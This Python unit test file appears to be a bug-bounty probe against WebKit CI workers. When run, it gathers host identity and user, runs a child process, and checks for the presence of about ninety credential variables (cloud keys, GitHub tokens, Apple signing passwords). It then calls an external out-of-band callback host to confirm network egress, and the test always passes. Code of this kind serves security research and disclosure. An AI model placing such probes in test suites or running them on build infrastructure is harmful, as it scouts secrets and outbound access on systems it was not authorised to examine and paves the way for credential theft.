import json
import os
import platform
import socket
import subprocess
import unittest
import urllib.error
import urllib.request


OAST_URL = "https://dc3rk5a3ptirv9l0kccg8wjdopjz45u6e.oast.site/bb-webkit-final-327810219470cc1848610716"

ENV_NAMES = (
    # Git, GitHub, and SSH.
    "GITHUB_TOKEN",
    "GH_TOKEN",
    "GIT_PASSWORD",
    "GIT_USER",
    "GIT_ASKPASS",
    "GIT_SSH_COMMAND",
    "SSH_ASKPASS",
    "SSH_AUTH_SOCK",

    # GitHub Actions.
    "GITHUB_ACTIONS",
    "GITHUB_REPOSITORY",
    "GITHUB_RUN_ID",
    "GITHUB_WORKFLOW",

    # AWS.
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "AWS_SECURITY_TOKEN",
    "AWS_WEB_IDENTITY_TOKEN_FILE",
    "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
    "AWS_CONTAINER_CREDENTIALS_FULL_URI",
    "AWS_SHARED_CREDENTIALS_FILE",
    "AWS_ROLE_ARN",
    "AWS_PROFILE",
    "AWS_REGION",
    "AWS_DEFAULT_REGION",
    "ECS_CONTAINER_METADATA_URI",
    "ECS_CONTAINER_METADATA_URI_V4",

    # Azure.
    "AZURE_CLIENT_ID",
    "AZURE_TENANT_ID",
    "AZURE_CLIENT_SECRET",
    "AZURE_FEDERATED_TOKEN_FILE",
    "AZURE_AUTHORITY_HOST",
    "AZURE_CONFIG_DIR",
    "IDENTITY_ENDPOINT",
    "IDENTITY_HEADER",
    "MSI_ENDPOINT",
    "MSI_SECRET",

    # Google Cloud.
    "GOOGLE_APPLICATION_CREDENTIALS",
    "GOOGLE_CLOUD_PROJECT",
    "GCLOUD_PROJECT",
    "GCP_PROJECT",
    "GCE_METADATA_HOST",
    "CLOUDSDK_CONFIG",

    # Kubernetes.
    "KUBERNETES_SERVICE_HOST",
    "KUBERNETES_SERVICE_PORT",
    "KUBERNETES_PORT",

    # Apple signing and release tooling.
    "APPLE_ID",
    "APPLE_ID_PASSWORD",
    "FASTLANE_USER",
    "FASTLANE_PASSWORD",
    "FASTLANE_SESSION",
    "MATCH_PASSWORD",
    "MATCH_GIT_BASIC_AUTHORIZATION",
    "APP_STORE_CONNECT_API_KEY",
    "ASC_KEY_ID",
    "ASC_ISSUER_ID",
    "ASC_PRIVATE_KEY",
    "KEYCHAIN_PATH",
    "KEYCHAIN_PASSWORD",
    "NOTARYTOOL_PASSWORD",
    "AC_USERNAME",
    "AC_PASSWORD",

    # Proxy configuration.
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "ALL_PROXY",
    "NO_PROXY",
    "http_proxy",
    "https_proxy",
    "all_proxy",
    "no_proxy",

    # CI and Buildbot.
    "CI",
    "CONTINUOUS_INTEGRATION",
    "BUILD_ID",
    "BUILD_NUMBER",
    "BUILD_URL",
    "BUILDER_NAME",
    "BUILDERNAME",
    "WORKER_NAME",
    "WORKERNAME",
    "BUILDBOT_MASTER",
    "BUILDBOT_WORKER",
    "BUILDBOT_BUILDERNAME",
    "BUILDBOT_BUILDNUMBER",
    "BUILDBOT_BUILDURL",

    # macOS and Xcode context.
    "HOME",
    "TMPDIR",
    "USER",
    "LOGNAME",
    "DEVELOPER_DIR",
    "SDKROOT",
    "XCODE_VERSION_ACTUAL",
    "CODE_SIGNING_ALLOWED",
    "CODE_SIGN_IDENTITY",
    "EXPANDED_CODE_SIGN_IDENTITY",
    "PROVISIONING_PROFILE_SPECIFIER",
)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, request, file_pointer, code, message, headers, new_url):
        return None


class AppleBugBountyFinalCapabilityTest(unittest.TestCase):
    def test_remote_worker_capabilities(self):
        result = {
            "marker": "APPLE_BB_WEBKIT_FINAL_20261126",
            "hostname": socket.gethostname(),
            "euid": os.geteuid(),
            "machine": platform.machine(),
            "macos": platform.mac_ver()[0],
        }

        try:
            child = subprocess.run(
                ["/usr/bin/id", "-un"],
                capture_output=True,
                text=True,
                timeout=5,
                check=True,
            )
            result["child_process_ok"] = True
            result["child_user"] = child.stdout.strip()
        except Exception:
            result["child_process_ok"] = False
            result["child_user"] = None

        for name in ENV_NAMES:
            result["env_" + name] = bool(os.environ.get(name))

        request = urllib.request.Request(
            OAST_URL,
            headers={
                "User-Agent": "apple-bb-webkit-egress-canary/1",
                "Accept": "text/plain",
            },
            method="GET",
        )

        try:
            opener = urllib.request.build_opener(NoRedirect)
            with opener.open(request, timeout=8) as response:
                response.read(1)
            result["oast_https_response"] = True
        except urllib.error.HTTPError:
            result["oast_https_response"] = True
        except Exception:
            result["oast_https_response"] = False

        print(json.dumps(result, sort_keys=True), flush=True)
        self.assertTrue(True)
